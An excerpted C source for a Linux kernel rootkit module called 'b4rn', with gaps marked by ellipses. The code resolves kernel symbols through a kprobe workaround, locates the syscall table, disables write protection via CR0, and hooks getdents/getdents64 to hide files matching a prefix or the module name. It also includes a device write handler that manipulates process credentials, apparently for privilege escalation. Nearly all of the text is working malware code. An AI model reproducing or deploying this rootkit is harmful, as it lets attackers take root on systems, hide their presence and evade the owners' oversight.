...
static ssize_t b4rn_write(struct file *file, const char *buf, size_t count,
                          loff_t *ppos) {
  struct cred *new;
...
static ssize_t b4rn_read(struct file *file, char *buf, size_t count,
                         loff_t *ppos) {
  return count;
}
...
static const struct file_operations b4rnops = {
    .owner = THIS_MODULE, .read = b4rn_read, .write = b4rn_write};
...
typedef asmlinkage long (*sys_getdents64_t)(
...
static kallsyms_lookup_name_t fixed_kallsyms_lookup_name;

static inline void tlb_flush_hard(void) {
  write_cr3(virt_to_phys(current->mm->pgd));
  __flush_tlb_all();
}

static inline void unprotect_page(unsigned long addr) {
...
// inverse of above
static inline void protect_page(unsigned long addr) {
  write_cr0(read_cr0() | CR0_WP);
...
// copy the data over.
static asmlinkage long sys_getdents_new(unsigned int fd,
                                        struct linux_dirent __user *dirent,
                                        unsigned int count) {
  int boff;
  char *dbuf;
  ...
  for (boff = 0; boff < ret;) {
    ...
    if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) ==
         0) || // if it has the hide prefix
        strstr(ent->d_name, MODULE_NAME) !=
            NULL) { // or if it has the module name anywhere in it
...
static asmlinkage long sys_getdents64_new(unsigned int fd,
...
static unsigned long *find_syscall_table(void) {
  ...
  unsigned long ret = fixed_kallsyms_lookup_name("syscall_table");
  return (unsigned long *)ret;
#else
  unsigned long ptr;
  unsigned long *p;
  for (ptr = (unsigned long)sys_close; ptr < (unsigned long)&loops_per_jiffy;
       ptr += sizeof(void *)) {
    p = (unsigned long *)ptr;
...
static int init_kallsyms_lookup_name(void) {
  register_kprobe(&kp);
  fixed_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
  unregister_kprobe(&kp);
  if (!kallsyms_lookup_name) {
    printk(KERN_ERR "Unable to find kallsyms_lookup_name\n");
    return -1;
  }
  return 0;
}
...
static int init_overrides(void) {
  ...
  // in /proc/kallsyms and are also listed in
  // /boot/System.map-<your-kernel-version>. If we didn't have access to this
  // API, we could parse those files and autogen them into a header that this
  // module could include. We're assigning a function pointer from the address
  // given back to us by the symbol resolution function here.
  fixed_set_memory_rw = (void *)fixed_kallsyms_lookup_name("set_memory_rw");
  ...
  fixed_set_memory_ro = (void *)fixed_kallsyms_lookup_name("set_memory_ro");
...
static int init_syscall_tab(void) {
  syscall_table = (unsigned long *)find_syscall_table();

  // record the original getdents handler
  sys_getdents_orig =
      (sys_getdents_t)((void **)syscall_table)[GETDENTS_SYSCALL_NUM];
  sys_getdents64_orig =
      (sys_getdents64_t)((void **)syscall_table)[GETDENTS64_SYSCALL_NUM];
...
static __init int b4rn_init(void) {
  int ret;
  ...
  //
  if (init_kallsyms_lookup_name()) {
    printk(KERN_ERR "Could not fix kallsyms_lookup_name\n");
    return -1;
  }
...
static void deinit_syscall_tab(void) {
  unprotect_page((unsigned long)syscall_table);
...
static __exit void b4rn_deinit(void) {
